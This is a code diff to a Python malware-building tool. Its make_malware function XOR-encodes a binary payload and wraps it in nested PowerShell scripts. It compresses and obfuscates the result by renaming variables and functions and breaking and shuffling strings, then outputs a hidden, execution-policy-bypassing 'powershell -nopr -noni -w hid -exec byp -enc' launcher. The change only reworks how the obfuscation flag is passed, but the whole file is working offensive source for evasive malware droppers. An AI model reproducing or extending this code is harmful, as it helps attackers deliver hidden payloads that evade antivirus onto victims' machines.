@@ -241,7 +241,7 @@ def stuff_payload(file_path, replacements):
         return contents
 
 
-def make_malware(payload_path, encoded):
+def make_malware(payload_path, encoded, obfuscated):
     # Create an obfuscated PowerShell payload with the given Base64 payload.
     # First, encrypt and encode the binary payload.
     (payload, xor_key) = encode_binary(open(payload_path, "rb").read())
@@ -251,7 +251,7 @@ def make_malware(payload_path, encoded):
         {"{{B64_PAYLOAD}}": payload, "{{XOR_KEY}}": xor_key,},
     )
     # Encode the payload.
-    (xor_key, method, payload) = deflate(obfuscate(payload, encoded))
+    (xor_key, method, payload) = deflate(obfuscate(payload, obfuscated))
     # Add the payload to the inner wrap.
     payload = stuff_payload(
         "resources/inner_wrap.ps1",
@@ -262,7 +262,7 @@ def make_malware(payload_path, encoded):
         },
     )
     # Encode the payload.
-    (_, _, payload) = deflate(obfuscate(payload, encoded), "gzipstream", key=0)
+    (_, _, payload) = deflate(obfuscate(payload, obfuscated), "gzipstream", key=0)
     # Stuff it into the outer wrap.
     payload = stuff_payload(
         "resources/outer_wrap.ps1", {"{{BASE64}}": payload,}
@@ -271,15 +271,14 @@ def make_malware(payload_path, encoded):
         # Return the encoded final wrap.
         return (
             "powershell -nopr -noni -w hid -exec byp -enc " + base64.b64encode(
-                payload.encode('utf-16-le')
+                obfuscate(payload, obfuscated).decode().encode('utf-16-le')
             ).decode()
         )
     # Return the obfuscated final wrap.
     return (
         "powershell -nopr -noni -w hid -exec byp " +
-        obfuscate(payload, encoded).decode()
+        obfuscate(payload, obfuscated).decode()
     )
-    #'''
 
 
 def modify_variable_assignment_methods(content):
@@ -350,15 +349,15 @@ def modify_variable_retrieval_methods(content):
     return content
 
 
-def obfuscate(content, encoded):
+def obfuscate(content, obfuscated):
     # Obfuscate the provided PowerShell script.
-    content = substitute_variables(content) if not encoded else content
-    content = modify_variable_assignment_methods(content)
-    content = modify_variable_retrieval_methods(content)
-    content = encode_new_object_declarations(content)
-    content = substitute_func_names(content)
-    content = wrap_calls(content)
-    if not encoded:
+    if obfuscated:
+        content = substitute_variables(content)
+        content = modify_variable_assignment_methods(content)
+        content = modify_variable_retrieval_methods(content)
+        content = encode_new_object_declarations(content)
+        content = substitute_func_names(content)
+        content = wrap_calls(content)
         content = break_strings(content)
         content = shuffle_strings(content)
         content = break_strings(content)
